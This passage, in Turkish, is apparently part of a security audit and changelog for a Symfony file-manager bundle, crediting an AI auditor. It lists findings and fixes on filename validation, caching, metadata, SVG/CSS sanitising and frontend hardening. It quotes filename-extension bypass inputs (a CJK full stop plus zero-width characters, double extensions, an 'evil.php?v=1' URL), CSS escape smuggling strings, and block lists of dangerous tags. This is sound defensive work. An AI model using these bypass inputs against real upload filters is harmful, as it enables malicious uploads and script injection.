    2. `RemoteUrlImporter::resolveSafeExtractedCandidate()` eklendi; aday dosya adı hem `$detectedMime` uzantılarıyla hem de `FileSecurityGuard::assertSafeFilename()` ile doğrulandı, uyumsuzsa (`avatar.json` → `avatar.png`, `render.php.png` → `render-php.png`) güvenli gövde + tespit edilen MIME uzantısına dönüştürüldü.
    3. `FilenameNormalizer::isStemInternalDotNotExtension()` içine `(new MimeTypes())->getMimeTypes(strtolower($candidateExt)) === []` kontrolü eklenerek `0-rc1`, `0_final`, `Smith` gibi gerçek bir MIME uzantısı olmayan noktalı gövdelerin mevcut uzantıyı (`.zip`, `.jpg`) koruması sağlandı.

- [x] **T-08 [ORTA-YÜKSEK] Rapor Bölüm 2.3 & Dokümantasyon (`13-doctrine-entegrasyonu.md`, `02`, `03`, `05`, `06`, `07`, `08`, `09`, `skills/**`) Tutarsızlıkları**
  - **Dosyalar:** `src/Command/DoctorCommand.php`, `src/Event/ItemRenamedEvent.php`, `src/Event/ItemMovedEvent.php`, `src/Event/ItemClonedEvent.php`, `docs/tr/02..13`, `skills/**`
  - **Tespit Edilen Tutarsızlık:**
    1. `DoctorCommand` `--check-remote` modunda `{user_id}` dinamik volume'lerini atlamadığı için CLI'da `guest/` dizini oluşturabilmekteydi.
    2. `13-doctrine-entegrasyonu.md` içindeki `DoctrineOrmMetadataStorage` örneğinde `FolderMetadataStorageInterface::copyPrefix()` metodu eksikti; `ProductImageRenameSyncListener` örneğinde `$event->oldPath` (`ItemRenamedEvent` üzerinde tanımsız özellik) kullanılmıştı; `canonical_key` uzunluğu `4096` yerine `1024` yazılmıştı.
    3. `07-depolama-s3-ve-dinamik-yapilandirma.md` içindeki `DatabaseFileManagerConfigProvider` örneğinde `getVolumes()` yerine `getVolumeNames()` yazılmıştı.
    4. `02`, `03`, `05`, `06`, `08`, `09` dokümanları ve `skills/**` dosyalarında yeni eklenen `locale`, `metadata.connection`, `metadata.auto_create_table` seçenekleri ve olay sınıfı özellikleri güncel değildi.
  - **Yapılan Düzeltme:** `DoctorCommand::volumeUsesDynamicUserIdToken()` eklendi; `ItemRenamedEvent` (`$oldPath`, `$oldCanonicalPath`), `ItemMovedEvent` (`$sourceVolume`, `$sourcePath`, `$sourceCanonicalPath`) ve `ItemClonedEvent` (`$sourcePath`, `$sourceCanonicalPath`) üzerinde dokümante edilen alias özellikler readonly olarak tanımlandı; tüm `docs/tr/**` ve `skills/**` dosyaları kodla %100 uyumlu hale getirildi.

---

## 5. 8. Tur (Pass-8) Yeni Güvenlik, Performans, Mantık ve Global Çok-Dilli/Unicode Bulguları (`P8-01` – `P8-14`)

> **Denetçi Model:** Google Antigravity — Gemini (High Reasoning Mode) | **Tarih:** 24.11.2026

Rapor tutarsızlıklarının giderilmesine ek olarak, bundle'ın tamamı üzerinde yapılan 8. tur derin güvenlik, performans ve global çok-dilli taramada aşağıdaki **14 yeni bulgu (`P8-01` – `P8-14`)** tespit edilmiş ve tamamı düzeltilerek `EighthPassGlobalSecurityAuditTest.php` + `frontend_audit_test.mjs` (Test 12) ile doğrulanmıştır:

- [x] **P8-01 [YÜKSEK GÜVENLİK / UNICODE] `FileSecurityGuard::assertSafeFilename()` — CJK Nokta Eşdeğeri (`。`/`｡`/`．`/`﹒`) + Görünmez Karakterli Uzantı (`"photo。j\u{200B}pg"`) Bypass'ı**
  - **Dosya:** `src/Security/FileSecurityGuard.php`
  - **Bulgu:** `PathNormalizer::extensionUtf8($nfcBase)` yalnızca ASCII `.` aradığı için `"photo。j\u{200B}pg"` veya `"doc｡p\u{200C}df"` girdisinde `$rawExt = ''` dönmekte ve uzantı içi görünmez karakter kontrolü (`UnicodeHelper::visibleSkeleton($rawExt) !== $rawExt`) atlanmaktaydı.
  - **Yapılan Değişiklik:** Uzantı karakter/görünmezlik doğrulaması hem `$nfcBase` hem de CJK nokta-katlanmış `$foldedNfc` ve `$foldedNfkc` üzerinden zorunlu tutuldu.

- [x] **P8-02 [KRİTİK PERFORMANS / DoS] `DuplicateDetector` — Boyutu Farklı Dosyaları Stream Edip SHA-256 Hesaplaması ve Toplu Yükleme / ZIP Açmada `O(N × M)` Tam Volume Okuması**
  - **Dosyalar:** `src/Service/DuplicateDetector.php`, `src/Service/ZipArchiveService.php`
  - **Bulgu:**
    1. `DuplicateDetector` önce dosya boyutuna (`fileSize`) göre filtreleme yapmadan volume'deki tüm dosyaları (`5.000` dosyaya kadar) stream edip SHA-256 hesaplamaktaydı.
    2. `ZipArchiveService::extractArchive()` döngüsünde her çıkarılan dosya `FileUploadedEvent` ile `__sha256__` önbelleğini sildiği için çok dosyalı bir ZIP açılırken volume yüzlerce kez baştan sona okunmaktaydı; ayrıca `$eventDispatcher === null` iken aynı ZIP içindeki iki özdeş dosya birbirini yakalayamamaktaydı.
  - **Yapılan Değişiklik:**
    1. `DuplicateDetector::getVolumeSizeIndex()` eklendi (`listContents('', true)` üzerinden **sıfır dosya okumasıyla** `boyut => [yollar]` indeksi). `findDuplicate()` önce yüklenen dosyanın byte boyutuna (`$targetSize`) bakmakta; volume'de aynı boyutta dosya yoksa **tek bir byte bile okumadan** `O(1)` sürede `null` dönmektedir. `buildVolumeHashIndex()` de yalnızca `count($paths) >= 2` olan (aynı boyutu paylaşan) dosyaların SHA-256 değerini hesaplamaktadır.
    2. `ZipArchiveService::extractArchive()` içinde `$seenArchiveHashes` haritası tutularak aynı ZIP arşivi içindeki mükerrer dosyaların da anında yakalanması sağlandı.

- [x] **P8-03 [YÜKSEK PERFORMANS & GÜVENLİK] `DirectoryLister` — Klasör Olmayan Dizinlerde ve Alt-Klasör Yenilemesinde (`refresh=1`) Gereksiz 2.000 Dizinlik Ağaç Taraması, `scanFullFolderTree` Yetkisiz (`VIEW`) Alt Öğe Sayımı ve Tekrarlı `filemtime()` Çağrısı**
  - **Dosya:** `src/Service/DirectoryLister.php`
  - **Bulgu:**
    1. `DirectoryLister::list()` ve `searchRecursive()` listelenen dizinde hiç alt klasör olmasa bile (`hasFolderEntry() === false`) veya `typeFilter` `'image'`/`'video'`/`'doc'` olsa bile `getFolderCountMap()` çağırarak tüm volume ağacını (2.000 dizine kadar) taramaktaydı.
    2. Bir alt klasörde `refresh=1` yapıldığında `$forceRefresh` doğrudan `getFolderCountMap()`'e geçirilerek tüm volume'ün ağaç önbelleği sıfırlanmaktaydı.
    3. `scanFullFolderTree()` Voter `VIEW` yetkisi olmayan gizli dosyaları klasör sayısına (`directFiles`, `recursiveFiles`) dahil etmekteydi.
    4. `resolveLocalCreatedAt()` Flysystem'den zaten bilinen `lastModified` değeri varken her dosya için tekrar `@filemtime($targetReal)` sistem çağrısı yapmaktaydı.
  - **Yapılan Değişiklik:** `getFolderCountMap()` yalnızca sonuç kümesinde en az bir klasör (`hasFolderEntry()`) varsa ve `$typeFilter` `'all'`/`'folder'` ise çağrıldı; ağaç önbelleği yalnızca kök dizin (`$cleanPath === ''`) yenilendiğinde zorla sıfırlandı; `scanFullFolderTree()` içine `VIEW` Voter kontrolü eklendi ve `resolveLocalCreatedAt()` içine bilinen `$lastModified` değeri aktarıldı.

- [x] **P8-04 [YÜKSEK PERFORMANS / ÇOKLU KİRACI] `CacheInvalidationListener` & `DirectoryCacheManager` — Klasör İşlemlerinde `invalidateProfile()` ile Tüm Kiracıların Önbelleğinin Silinmesi ve 4 Ayrı `getItem()` Çağrısı**
  - **Dosyalar:** `src/EventListener/CacheInvalidationListener.php`, `src/Service/DirectoryCacheManager.php`
  - **Bulgu:**
    1. `CacheInvalidationListener` klasör işlemlerinde `invalidateVolume()` yanında `invalidateProfile()` çağırarak aynı profili paylaşan tüm kiracıların/volume'lerin önbelleğini silmekteydi.
    2. `DirectoryCacheManager::rememberWithGenerations()` 4 nesil anahtarını tek `$cachePool->getItems([...])` yerine 4 ayrı `getItem()` çağrısıyla okumaktaydı.
  - **Yapılan Değişiklik:** `CacheInvalidationListener` içindeki 3 mükerrer `invalidateProfile()` çağrısı kaldırılarak iptal işlemi ilgili volume ve dizinlerle sınırlandırıldı; `DirectoryCacheManager::readGenerations()` ile 4 nesil anahtarı tek bir `getItems()` çağrısında birleştirildi.

- [x] **P8-05 [ORTA-YÜKSEK MANTIK] `ThumbnailCleanupListener` & `ThumbnailManager` — Klasör Kopyalamada Kaynak Küçük Resimlerin Silinmesi, `ItemClonedEvent` Eksikliği ve NFC Anahtar Normalizasyonu**
  - **Dosyalar:** `src/EventListener/ThumbnailCleanupListener.php`, `src/Thumbnail/ThumbnailManager.php`
  - **Bulgu:** `ThumbnailCleanupListener::onItemMoved()` klasör kopyalamada (`$event->isCopy === true`) kaynak klasörün küçük resimlerini de silmekte; `ItemClonedEvent` dinlenmemekte; `ThumbnailManager::getCachedPath()` `$canonicalPath` üzerinde `UnicodeHelper::toNfc()` uygulamamaktaydı.
  - **Yapılan Değişiklik:** `cleanupFolderTransition()` içine `bool $deleteOld = true` (`!$event->isCopy`) parametresi eklendi; `ItemClonedEvent` aboneliği (`onItemCloned`) eklendi ve `ThumbnailManager::getCachedPath()` içinde NFC normalizasyonu zorunlu kılındı.

- [x] **P8-06 [ORTA-YÜKSEK UNICODE & METADATA] `JsonFileMetadataStorage`, `DoctrineDbalMetadataStorage` & `MetadataSyncListener` — Kanonik Anahtarlarda NFC Normalizasyonu ve Tekil Dosya Kopyalama/Klonlamada Hedefteki Bayat Metadata Temizliği**
  - **Dosyalar:** `src/Metadata/JsonFileMetadataStorage.php`, `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`, `src/EventListener/MetadataSyncListener.php`
  - **Bulgu:** Metadata depolarında (`get`, `save`, `delete`, `relocatePrefix`, `copyPrefix` ve `decodePayload`) gelen anahtarlar `UnicodeHelper::toNfc()` ile normalize edilmemekte; ayrıca metasız bir dosya daha önce metası kalmış bir hedef yola kopyalandığında/klonlandığında hedefteki bayat metadata silinmemekteydi.
  - **Yapılan Değişiklik:** Tüm metadata okuma/yazma/taşımalarında NFC normalizasyonu uygulandı; `MetadataSyncListener::onItemMoved()` ve `onItemCloned()` içinde `$this->metadataStorage->save(..., $meta)` koşulsuz çağrılarak kaynak metasız olduğunda hedefteki bayat metanın silinmesi sağlandı.

- [x] **P8-07 [ORTA-YÜKSEK GÜVENLİK & MANTIK] `StorageQuotaChecker::getDetailedBreakdown()` — `topFolders` ve `largestFiles` Listelerinin `VIEW` Voter Filtresinden Önce 6 Öğeye Kesilmesi**
  - **Dosya:** `src/Service/StorageQuotaChecker.php`
  - **Bulgu:** `scanDetailedVolumeStats()` en büyük 6 klasör ve dosyayı Voter kontrolünden önce kestiği için, ilk 6 öğeye `VIEW` yetkisi olmayan bir kullanıcı kendi görebildiği en büyük dosya ve klasörleri görememekteydi.
  - **Yapılan Değişiklik:** `scanDetailedVolumeStats()` aday havuzunu `TOP_LIST_LIMIT * 8` (`48`) olarak sakladı ve `getDetailedBreakdown()` `VIEW` Voter filtresinden **sonra** ilk `6` öğeyi (`array_slice(..., 0, self::TOP_LIST_LIMIT)`) kesti.

- [x] **P8-08 [ORTA GÜVENLİK & PERFORMANS] `UploadManager::handleUpload()` — Parçalı Yüklemede (`handleChunk`) İlk Parçada `normalizeForUpload` Ön-Doğrulaması**
  - **Dosya:** `src/Service/UploadManager.php`
  - **Bulgu:** Parçalı yüklemede (`totalChunks > 1`) `normalizeForUpload()` yalnızca tüm parçalar tamamlanıp birleştirildikten sonra (`finalizeFile`) çağrılmaktaydı.
  - **Yapılan Değişiklik:** `handleUpload()` başında ilk parça kabul edilmeden önce `$this->filenameNormalizer->normalizeForUpload($clientName, $profile, PathNormalizer::basenameUtf8($effectiveDir))` çalıştırılarak geçersiz dosya adlarının 0. parçada reddedilmesi sağlandı.

- [x] **P8-09 [ORTA MANTIK] `ImageOptimizer::optimizeWithImagick()` — `strip_exif: false` İken `thumbnailImage()` Çağrısının Tüm EXIF/ICC Profillerini Silmesi**
  - **Dosya:** `src/Service/ImageOptimizer.php`
  - **Bulgu:** `Imagick::thumbnailImage()` her zaman EXIF/ICC verilerini dahili olarak sildiği için `strip_exif: false` ayarlandığında boyut küçültme sırasında EXIF verileri kaybolmaktaydı.
  - **Yapılan Değişiklik:** `$opt['stripExif'] === true` iken `thumbnailImage()`, `$opt['stripExif'] === false` iken EXIF/ICC profillerini koruyan `scaleImage()` kullanıldı.

- [x] **P8-10 [ORTA GÜVENLİK & UNICODE] `AssetUsageGuardService`, `SymfonyAiAssetEnricher`, `ZipArchiveService` ve `RemoteUrlImporter` Ek Sertleştirmeleri**
  - **Dosyalar:** `src/Service/AssetUsageGuardService.php`, `src/Bridge/SymfonyAI/SymfonyAiAssetEnricher.php`, `src/Service/ZipArchiveService.php`, `src/Service/RemoteUrlImporter.php`
  - **Yapılan Değişiklik:**
    1. `AssetUsageGuardService`: `sanitizeReference()` içinde `mb_scrub` + NFC + C0/C1/BiDi temizliği, `sanitizeEditUrl()` içinde `UnicodeHelper::hasForbiddenControls()` + `user:pass@` engeli ve `buildDedupeKey()` içinde `'UTF-8'` kodlaması eklendi.
    2. `SymfonyAiAssetEnricher`: Prompt içine gömülen `$locale` (`MessageTranslator::isValidLocaleString`) ve `$filename` (kontrol/BiDi/tırnak temizliği + 120 karakter sınırı) sertleştirildi.
    3. `ZipArchiveService`: `sanitizeZipSegment()` içinde NFC + C0/C1/BiDi + CJK nokta temizliği ve `isJunkArchiveEntry()` içinde alt dizinlerdeki `/__MACOSX/` ve `._*` AppleDouble dosyalarının atlanması sağlandı.
    4. `RemoteUrlImporter`: 3xx yönlendirmelerinde birden fazla `Location` başlığı varsa (`count($locations) !== 1`) HTTP Response Splitting / Proxy Desync koruması olarak yönlendirme reddedildi.

- [x] **P8-11 [ORTA GÜVENLİK] `FileManagerTwigExtension`, `templates/easyadmin/field.html.twig`, `AutoInjectDialogHostSubscriber` ve `dialog_controller.js` Sertleştirmeleri**
  - **Dosyalar:** `src/Twig/Extension/FileManagerTwigExtension.php`, `templates/easyadmin/field.html.twig`, `src/EventListener/AutoInjectDialogHostSubscriber.php`, `assets/controllers/dialog_controller.js`
  - **Yapılan Değişiklik:**
    1. `FileManagerTwigExtension::describeUrlFieldItem()` doğrudan `.svg` URL'lerinde üst-seviye `<a href="...svg" target="_blank">` yerine `'href' => null` döndürdü; `templates/easyadmin/field.html.twig` içinde `info.href` boş olduğunda `<a>` yerine `<span>` render edildi.
    2. `AutoInjectDialogHostSubscriber` profilin kendi `locale` ve `ui.z_index` değerlerini kullandı ve `isInsideRawTextElement()` içine `style` ile `template` etiketlerini dahil etti.
    3. `dialog_controller.js` `DANGEROUS_TAGS` listesine `foreignobject,animate,animatemotion,animatetransform,animatecolor,set,feimage,handler,listener` eklendi ve `scrubNodeTree()` içinde `xml:base` ile `url(` / `src(` / `@import` içeren `style` ve SVG sunum öznitelikleri temizlendi.

- [x] **P8-12 [YÜKSEK PERFORMANS — FRONTEND] `browser_controller.js::renderInspector()` Görsel Boyutu Önbelleği (`imageDimsCache`) ve Marquee (Kement) Seçiminde Layout Thrashing Önleme**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `renderInspector()` her dosya seçiminde veya klavye ok tuşu geçişinde tam boyutlu orijinal görseli önbelleksiz olarak `new Image()` ile yeniden indirmekte ve önceki `Image` isteğini iptal etmemekteydi; `onContentMouseDown()` marquee seçiminde ise her `mousemove` olayında tüm kartlar üzerinde `getBoundingClientRect()` çağırarak senkron layout reflow oluşturmakta ve seçilen klasörlere `volume` özelliğini eklememekteydi.
  - **Yapılan Değişiklik:** `this.imageDimsCache` (500 öğe sınırlı `Map`) ve `this._inspectorImageProbe` iptal mekanizması eklendi; marquee seçiminde kartların koordinatları sürükleme başında bir kez önbelleğe alındı ve seçilen klasörlere `volume` bilgisi eklendi.

- [x] **P8-13 [ORTA GÜVENLİK & UNICODE — FRONTEND] Frontend URL Doğrulayıcılarında C1/BiDi/Sıfır-Genişlikli Kontrol Karakterleri ve `picker_controller.js` `isSafeRelativePath()` CJK Nokta/Dot-File Kontrolü**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `assets/controllers/picker_controller.js`, `assets/controllers/dialog_controller.js`, `assets/js/integrations/ckeditor5_adapter.js`, `assets/js/integrations/tinymce_adapter.js`, `assets/js/integrations/tiptap_adapter.js`
  - **Yapılan Değişiklik:** Tüm frontend URL/path doğrulayıcılarındaki kontrol karakteri regex'i C1 kontrolleri, satır ayırıcıları, sıfır genişlikli karakterler ve BiDi override'ları (`/[\u0000-\u001F\u007F-\u009F\u200B-\u200F\u2028-\u202E\u2060\u2066-\u2069\uFEFF\u061C]/`) kapsayacak şekilde genişletildi; `picker_controller.js` içine NFKC + CJK nokta katlama (`[\uFF0E\u3002\uFF61\uFE52]`) ve `.trash`/dot-segment engeli uygulayan `isSafeRelativePath()` eklendi.

- [x] **P8-14 [DÜŞÜK-ORTA RTL & BELLEK — FRONTEND] RTL Lightbox Klavye Ok Tuşu Yönü, RTL Kota Kutusu Hover Aynalama, `svgSanitizeCache` Boyut Sınırı, `downloadZip` `revokeObjectURL` Süresi ve `disconnect()` Medya Temizliği**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `assets/styles/core.css`
  - **Yapılan Değişiklik:** Lightbox açıkken `ArrowLeft`/`ArrowRight` yönü `this.isRtl()` ile uyumlu hale getirildi; `core.css` içinde `.liveux-fm[dir="rtl"] .liveux-fm-quota-box:hover .liveux-fm-quota-more` için `scaleX(-1) translate(1px, -1px)` korundu; `svgSanitizeCache` 256 öğeyle sınırlandırıldı; `downloadZip` `revokeObjectURL` süresi 30 saniyeye çıkarıldı ve `disconnect()` içinde aktif `<video>`/`<audio>` oynatıcıları durdurulup temizlendi.

---

## 6. 9. Tur (Pass-9) — Rapor, Dokümantasyon ve Skill Tutarlılık Denetimi (`T9-01` – `T9-10`)

9. turun ilk aşamasında `14-guvenlik-denetim-ve-degisiklik-raporu.md` başta olmak üzere tüm Türkçe/İngilizce dokümanlar, skill referans dosyaları, Twig yorumları ve önceki turlarda düzeltildiği bildirilen davranışlar **gerçek kaynak kod satırlarıyla çapraz doğrulanmış**, tespit edilen **10 tutarsızlık** eksiksiz giderilmiştir:

- [x] **T9-01 [RAPOR & KOD] Denetçi Model Künyesi + Pass-8 Önbellek Zehirlenmesi (`P8-03`) Gerçek Çok-Kullanıcılı İzolasyon Tutarsızlığı**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `docs/tr/14-guvenlik-denetim-ve-degisiklik-raporu.md`
  - **Tutarsızlık:** Model künyesi güncel reasoning seviyesini yansıtmamaktaydı ve `DirectoryLister::loadCachedRawTree()` paylaşımlı `__tree_v2__` önbelleğini oluştururken hâlâ `$this->authorizer->isGranted()` çağırarak ilk kullanıcının reddedilen klasörlerini tüm diğer kullanıcıların önbelleğinden silebiliyordu; ayrıca `resolveFolderCount()` etkin Voter profillerinde (`$authChecker !== null && $profile->isVoterEnabled()`) gizli alt öğe sayılarını açığa çıkarabilmekteydi.
  - **Düzeltme:** Künye **`Google Antigravity — Gemini (Extra High Reasoning)`** olarak güncellendi; `loadCachedRawTree()` içinden kullanıcıya özel `isGranted()` kaldırılarak yetki filtrelemesi yalnızca önbellek okuması sonrası `listFullTree()` katmanına bırakıldı ve etkin Voter ortamında klasör öğe sayacı (`itemCount`) gizlendi.
  - **Regresyon Testi:** `NinthPassGlobalSecurityAuditTest::testDirectoryListerCacheIsolationNoPoisoningAndBatchRecursiveSearch`

- [x] **T9-02 [DOKÜMAN & KOD] `docs/tr/09-symfony-ai-entegrasyonu.md` — `auto_enrich_on_upload` Asenkron Messenger Çelişkisi ve YAML MIME Desteği**
  - **Dosyalar:** `src/Bridge/SymfonyAI/SymfonyAiAssetEnricher.php`, `docs/tr/09-symfony-ai-entegrasyonu.md`
  - **Tutarsızlık:** Doküman yükleme anında asenkron Messenger handler tarifine yer verirken gerçek dinleyicinin senkron çalıştığıyla çelişmekteydi ve `text/yaml` MIME türü `SymfonyAiAssetEnricher::TEXT_MIMES` listesinde eksikti.
  - **Düzeltme:** Doküman `auto_enrich_on_upload` davranışını netleştirecek ve `application/yaml` / `application/x-yaml` / `text/yaml` türlerini doğru listeleyecek şekilde güncellendi; `SymfonyAiAssetEnricher::TEXT_MIMES` içine `'text/yaml'` eklendi.

- [x] **T9-03 [DOKÜMAN] `docs/tr/13-doctrine-entegrasyonu.md` — `preload()` Tek-Sorgu İddiası ve Örnek Listener Kodundaki Eksikler**
  - **Dosya:** `docs/tr/13-doctrine-entegrasyonu.md`
  - **Tutarsızlık:** Dokümanda `preload()` `"yalnızca tek bir SELECT"` olarak ifade edilmiş (gerçek kod 400 anahtarlık parçalar halinde çalışır); örnek `DoctrineOrmMetadataStorage` kodunda `UnicodeHelper::toNfc()`, `ESCAPE '!'` ve `relocatePrefix()` flush sırası eksikti; `ProductImageRenameSyncListener` path segmentlerini `rawurlencode()` etmiyor ve klasör/`ItemMovedEvent` senaryolarını kapsamıyordu.
  - **Düzeltme:** Dokümandaki tüm açıklamalar ve örnek sınıflar üretim koduyla birebir uyumlu hale getirildi.

- [x] **T9-04 [DOKÜMAN & SKILL] Domain Event Sözleşmeleri (`ItemClonedEvent`, `Trash*Event`, `FileUploadedEvent`) ve `ThumbnailController` Cache Başlıkları**
  - **Dosyalar:** `docs/tr/08-olaylar-komutlar-cache-ve-sorun-giderme.md`, `skills/liveux-file-manager-extensions-and-ai/references/contracts-and-events.md`
  - **Tutarsızlık:** `TrashRestoredEvent` ve `TrashPurgedEvent` üzerinde gerçekte bulunmayan `$trashId`/`$isFolder` alanları yazılmıştı; `$fromArchiveExtraction`, `$oldPath`, `$oldCanonicalPath`, `$sourceVolume`, `$targetCanonicalPath`, `$originalCanonicalPath`, `$trashCanonicalPath` gibi gerçek özellikler eksikti; public/private `ThumbnailController` `Cache-Control` davranışı belirsizdi ve `09-symfony-ai-entegrasyonu.md` alt bağlantısı eksikti.
  - **Düzeltme:** Tüm event tabloları ve cache açıklamaları PHP event sınıflarıyla birebir eşlendi.

- [x] **T9-05 [DOKÜMAN & TWIG] `docs/tr/03-kullanim-modlari-ve-js-api.md`, `05-formtype-ve-editor-entegrasyonu.md`, `templates/base/parts/_settings_popover.html.twig`**
  - **Dosyalar:** `docs/tr/03-kullanim-modlari-ve-js-api.md`, `docs/tr/05-formtype-ve-editor-entegrasyonu.md`, `templates/base/parts/_settings_popover.html.twig`
  - **Tutarsızlık:** Boş alan sağ-tık menüsünde artık bulunmayan öğeler listeleniyordu; video uzantısı olarak `.ogv` yerine `.ogg` yazılmıştı; `SliderLiveFormType` örneğinde `FormEvent`/`FormEvents` importları eksikti; `_settings_popover.html.twig:31` yorumunda slider üst sınırı `280px` yerine gerçek `320px` ile uyuşmuyordu.
  - **Düzeltme:** Tüm dokümanlar ve Twig yorumu gerçek kod/UI ile senkronize edildi (`DirectoryLister::VIDEO_EXTENSIONS` içine `'ogv'` ve `browser_controller.js` `typeMap` içine `ogv/m4v/m4a/aac` eklendi).

- [x] **T9-06 [DOKÜMAN, SKILL & TEST KOMUTLARI] İngilizce Dokümanlar, `max_files`, İkon Dizini ve Katkı Rehberleri**
  - **Dosyalar:** `docs/en/02-configuration.md`, `docs/en/04-themes-and-icons.md`, `skills/liveux-file-manager-forms-and-editors/references/picker-and-js-api.md`, `AGENTS.md`, `skills/liveux-file-manager-contributing/SKILL.md`, `CHANGELOG.md`
  - **Tutarsızlık:** `max_files` varsayılanı yanlış yazılmıştı; custom ikon sayısı/yapısı güncelliğini yitirmişti; `liip_imagine` fallback durumu eksikti; JS test komutunda yalnızca `dom_security_test.mjs` geçip `frontend_audit_test.mjs` atlanıyordu.
  - **Düzeltme:** `max_files` varsayılanı `null`, ikon dizin şeması (`meta.json`, 9 dosya ikonu, 49 `ui/*.svg`, 14 `badges/*.svg`) ve `frontend_audit_test.mjs` komutu tüm dosyalara eklendi.

- [x] **T9-07 [CONTROLLER DOĞRULAMA] `ApiController::dialog()` Dizi Parametre HTTP 500 Hatası ve `saveMetadata` `"pinned": null` Sorunu**
  - **Dosya:** `src/Controller/ApiController.php`
  - **Tutarsızlık:** `dialog?profile[]=x&locale[]=fr` gibi dizi query parametreleri skaler varsayımı nedeniyle HTTP 500 `TypeError` üretmekteydi; `saveMetadata` gövdesinde `"pinned": null` gönderildiğinde mevcut `pinned: true` bayrağı `false`'a çekilmekteydi.
  - **Düzeltme:** `scalarString()` / `scalarBool()` tüm `dialog()` parametrelerine uygulanarak HTTP `400` döndürüldü; `handleSaveMetadata()` içinde `array_key_exists('pinned', $p) && $p['pinned'] !== null` koşuluyla mevcut `pinned` değeri korundu.
  - **Regresyon Testi:** `NinthPassGlobalSecurityAuditTest::testApiControllerAndImageEditorControllerHardening`

- [x] **T9-08 [DI KONFİGÜRASYON & COMPILER PASS] `Configuration` `zip.allow_extract` Ezme Hatası ve `FlysystemServiceLocatorPass` `%parameter%`**
  - **Dosyalar:** `src/DependencyInjection/Configuration.php`, `src/DependencyInjection/Compiler/FlysystemServiceLocatorPass.php`
  - **Tutarsızlık:** Sonraki bir YAML kaynağında `zip.allow_extract: false` tanımlandığında önceki kaynaktan miras alınan `permissions.extract_zip: true` değeri temizlenmiyordu; `FlysystemServiceLocatorPass` `driver_options.service` içindeki `%param%` yer tutucularını çözmüyordu.
  - **Düzeltme:** `Configuration::beforeNormalization()` içine `false` override desteği eklendi; `FlysystemServiceLocatorPass` `$container->getParameterBag()->resolveValue()` ile parametre çözümlemesi yaptı.
  - **Regresyon Testi:** `NinthPassGlobalSecurityAuditTest::testCliCommandsDiConfigAutoInjectAndPathNormalizerEdgeCases`

- [x] **T9-09 [CLI TUTARLILIĞI] `{user_id}` Private Volume `--volume` Çıkış Kodu, `ThumbnailClearCommand` İç İçe Klasör ve `DoctorCommand` Görünümü**
  - **Dosyalar:** `src/Command/{Duplicates,TrashPurge,ThumbnailWarmup,EnrichMetadata,OptimizeImages,ThumbnailClear,Doctor}Command.php`
  - **Tutarsızlık:** `--volume=private` gibi `{user_id}` içeren bir volume hedeflendiğinde komutlar skip sonrası `FAILURE` döndürüyordu; `ThumbnailClearCommand` iç içe `cache_dir` yollarını çakışma olarak algılamıyordu ve `{user_id}` atlamasını sessiz geçiyordu; `DoctorCommand` çözülmüş yol yerine ham `{user_id}` şablonunu ve `volumes !== []` iken yedek `$profile->path` satırını yanlış gösteriyordu.
  - **Düzeltme:** `$matchedVolumes` atlama öncesinde artırıldı; `ThumbnailClearCommand` içine `isDirShared()`, `isCoveredByClearedDir()`, `findOverlappingDirKeys()` ve `$io?->note(...)` eklendi; `DoctorCommand` ham şablonu ve gerçek active volume durumunu doğru raporladı.

- [x] **T9-10 [SUBSCRIBER HTML PARSER] `AutoInjectDialogHostSubscriber::isInsideRawTextElement()` Custom Element Yanlış Eşleşmesi**
  - **Dosya:** `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Tutarsızlık:** `<\s*template` deseni sınır kontrolü olmadan `<template-card>` veya `<style-guide>` gibi özel HTML etiketlerini `<template>`/`<style>` sanarak DialogHost enjeksiyonunu devre dışı bırakıyordu.
  - **Düzeltme:** Regex `<\s*%s(?=[\s>\/])` sınırıyla sıkılaştırıldı.

---

## 7. 9. Tur (Pass-9) — Yeni Güvenlik, Performans, Mantık, Eşzamanlılık ve Global Unicode Bulguları (`P9-01` – `P9-15`)

9. turda tüm PHP, JS, Twig, CSS ve DI/CLI bileşenleri **satır-satır hacker ve performans perspektifiyle** yeniden taranmış; **15 yeni bulgu** kodda kapatılmış ve `NinthPassGlobalSecurityAuditTest` + `frontend_audit_test.mjs` Test 13 ile doğrulanmıştır:

### 7.1. Güvenlik, RBAC, XSS ve Yarış Durumu Bulguları (`P9-01` – `P9-07`)

- [x] **P9-01 [YÜKSEK GÜVENLİK] `FileSecurityGuard` Tam Bloklu Çift Uzantı Kapsamı & `FileManagerPickerType` `?query` Bypass Kapatması**
  - **Dosyalar:** `src/Security/FileSecurityGuard.php`, `src/Form/FileManagerPickerType.php`
  - **Bulgu:** `FileSecurityGuard` çift uzantı regex'i `BLOCKED_EXTENSIONS` içindeki `js`, `xhtml`, `hta`, `wasm`, `phtm` gibi tehlikeli uzantıları kaçırabilmekteydi; `FileManagerPickerType::isSafePickerValue()` ise `$queryPart === ''` koşulu nedeniyle `https://cdn.example.com/evil.php?v=1` gibi query string taşıyan zararlı URL dosya adlarında `assertSafeFilename($baseLeaf)` kontrolünü atlıyordu.
  - **Yapılan Değişiklik:** `getDoubleExtensionPattern()` dinamik olarak `BLOCKED_EXTENSIONS + ['svg']` listesinden üretilip önbelleklendi ve `MimeTypes::getDefault()` kullanıldı; `FileManagerPickerType` içindeki `&& $queryPart === ''` istisnası kaldırıldı.

- [x] **P9-02 [YÜKSEK GÜVENLİK & DoS] `SvgSanitizer` UTF-16 Surrogate Escape HTTP 500 DoS + `dialog_controller.js` Derin CSS Sanitizer**
  - **Dosyalar:** `src/Security/SvgSanitizer.php`, `assets/controllers/dialog_controller.js`
  - **Bulgu:** `\d800`..`\dfff` CSS escape dizileri PHP 8'de `mb_chr()` üzerinden `false` döndürüp sıkı dönüş tipinde `\TypeError` DoS hatası üretmekteydi; `dialog_controller.js::sanitizeHtmlFragment()` `style` ve SVG sunum özniteliklerinde CSS escape/yorum kaçakçılığını (`u/*x*/rl`, `\75rl`, satır devamı `u\\\nrl`, `image-set(`) yeterince süzmüyordu.
  - **Yapılan Değişiklik:** `SvgSanitizer::decodeCssEscapes()` `0xD800..0xDFFF` surrogate aralığını ve `is_string(...)` dışı sonuçları reddetti; `dialog_controller.js` içine tam `hasUnsafeCssValue()` denetimi eklendi ve `frameUrl` ayırıcı (`?`/`&`) düzeltildi.

